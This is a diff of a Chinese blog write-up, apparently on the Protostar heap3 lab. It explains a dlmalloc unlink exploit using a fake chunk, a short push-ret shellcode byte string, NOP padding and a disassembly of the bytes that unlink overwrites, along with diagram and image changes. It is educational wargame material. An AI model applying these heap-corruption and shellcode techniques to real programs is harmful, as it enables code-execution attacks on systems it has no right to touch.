+</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x68\x64\x88\x04\x08\xc3&#34;</span>
+</span></span></code></pre></div><p>然后，直接可以画出这张图了：</p>
+<p><img src="/p/protostar_heap_3/fakechunk_after.png"
+	width="1662"
+	height="930"
+	srcset="/p/protostar_heap_3/fakechunk_after_hu7bd00f0ddcd30b9862bab328e88dbb8f_263828_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_after_hu7bd00f0ddcd30b9862bab328e88dbb8f_263828_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
-		alt="fakechunk"
+		alt="fakechunk_after.png"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="153"
-		data-flex-basis="368px"
+		data-flex-grow="178"
+		data-flex-basis="428px"
 	
 ></p>
+<hr>
 <h2 id="free-a-fastbin">Free a fastbin</h2>
 <p>其实已经基本解完了&hellip;但其实还有最后一个小问题</p>
 <p>我们先用上一节的那张图片的思路来试一下吧（第三个参数完全不需要，所以随便写一个 ABCD 就行）</p>
@@ -768,7 +544,8 @@ ret
 <br>
 <p>另外，<code>0x804c010</code> 也被写上了奇怪的东西&hellip;也就是</p>
 <blockquote>
-<p>而且在第四步还出现了 <code>addr of shellcode+0x8 = addr of puts()</code>，也就是说这个 shellcode + <code>0x8</code> 的位置会被 <code>unlink()</code> 写上 <code>addr of puts()</code>&hellip;</p>
+<p>我们必须得纳入考虑并避免的：
+bk + 0x8 = addr of puts</p>
 </blockquote>
 <p>这时候就又要请出 NOP 了&hellip;我们直接把 <code>0x804c008</code> 到 <code>0x804c010</code> 全写上 NOP 就好了&hellip;</p>
 <p><img src="/p/protostar_heap_3/nop.png"
@@ -785,19 +562,32 @@ ret
 		data-flex-basis="1142px"
 	
 ></p>
+<blockquote>
+<p>实际上，我觉得我这里做的有点点问题</p>
+<p>毕竟，虽然写上了 NOP，但 0x804c010 处的 addr of puts 的地址也确实会被当作一些指令</p>
+<p>这次运气倒是比较好，因为这个指令翻译过去的话是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># x86 (32), Little Endian</span>
+</span></span><span class="line"><span class="cl">1cb10408
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Disassembly</span>
+</span></span><span class="line"><span class="cl">0x0000000000000000:  1C B1    sbb al, 0xb1
+</span></span><span class="line"><span class="cl">0x0000000000000002:  <span class="m">04</span> <span class="m">08</span>    add al, <span class="m">8</span>
+</span></span></code></pre></div><p>看起来还算正常，并不会导致 Segmentation Fault</p>
+<p>但下次果然还是应该多考虑一下</p>
+</blockquote>
 <p>那么重新画一下图，就是这样：</p>
 <p><img src="/p/protostar_heap_3/true.png"
-	width="1522"
-	height="992"
-	srcset="/p/protostar_heap_3/true_hu6ac2e7c3e3bc9a548d253792e3254835_230261_480x0_resize_box_3.png 480w, /p/protostar_heap_3/true_hu6ac2e7c3e3bc9a548d253792e3254835_230261_1024x0_resize_box_3.png 1024w"
+	width="1662"
+	height="930"
+	srcset="/p/protostar_heap_3/true_hu7bd00f0ddcd30b9862bab328e88dbb8f_264219_480x0_resize_box_3.png 480w, /p/protostar_heap_3/true_hu7bd00f0ddcd30b9862bab328e88dbb8f_264219_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="true"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="153"
-		data-flex-basis="368px"
+		data-flex-grow="178"
+		data-flex-basis="428px"
 	
 ></p>
 <hr>
@@ -832,14 +622,13 @@ ret
 <!DOCTYPE html>
 <html>
 <head>
-<title>Untitled Diagram-6-7-4</title>
+<title>Untitled Diagram</title>
 <meta charset="utf-8"/>
 </head>
-<body><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;page&quot;:0,&quot;toolbar&quot;:&quot;pages zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-04-07T05:44:36.169Z\&quot; agent=\&quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&quot; etag=\&quot;3GpF4croqte_4CpXaax2\&quot; version=\&quot;17.4.0\&quot; type=\&quot;device\&quot; pages=\&quot;2\&quot;&gt;&lt;diagram id=\&quot;9m9pWsRvkve3vRoIh5zU\&quot; name=\&quot;Page-1\&quot;&gt;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&lt;/diagram&gt;&lt;diagram id=\&quot;Yspwrotni0tyzMKoO_N9\&quot; name=\&quot;Page-2\&quot;&gt;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&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div>
+<body><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;page&quot;:0,&quot;toolbar&quot;:&quot;pages zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-04-20T06:46:08.668Z\&quot; agent=\&quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&quot; etag=\&quot;4pQ9NjlFAk0gBzxx88za\&quot; version=\&quot;17.4.5\&quot; pages=\&quot;2\&quot;&gt;&lt;diagram id=\&quot;9m9pWsRvkve3vRoIh5zU\&quot; name=\&quot;Page-1\&quot;&gt;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&lt;/diagram&gt;&lt;diagram id=\&quot;Yspwrotni0tyzMKoO_N9\&quot; name=\&quot;Page-2\&quot;&gt;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&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div>
 <script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script>
 </body>
 </html>
-
 </section>
 
 
@@ -956,14 +745,19 @@ ret
         
         
             <div class="article-image">
-                
-                    <img src="/cover.png" loading="lazy" data-key="dlmalloc_unlink_vuln" data-hash="/cover.png"/>
